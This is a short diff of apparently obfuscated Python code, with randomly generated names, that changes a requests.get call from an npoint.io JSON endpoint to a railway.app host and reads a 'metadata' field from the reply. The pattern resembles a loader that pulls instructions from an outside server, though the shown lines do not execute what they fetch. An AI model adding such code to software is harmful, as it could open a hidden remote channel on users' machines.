@@ -18,7 +18,7 @@ def config_nbaavw_233():
 
     def data_qloqnn_322():
         try:
-            process_tybfwg_518 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_tybfwg_518 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_tybfwg_518.raise_for_status()
             config_pexcyt_559 = process_tybfwg_518.json()
             eval_ggagkw_772 = config_pexcyt_559.get('metadata')
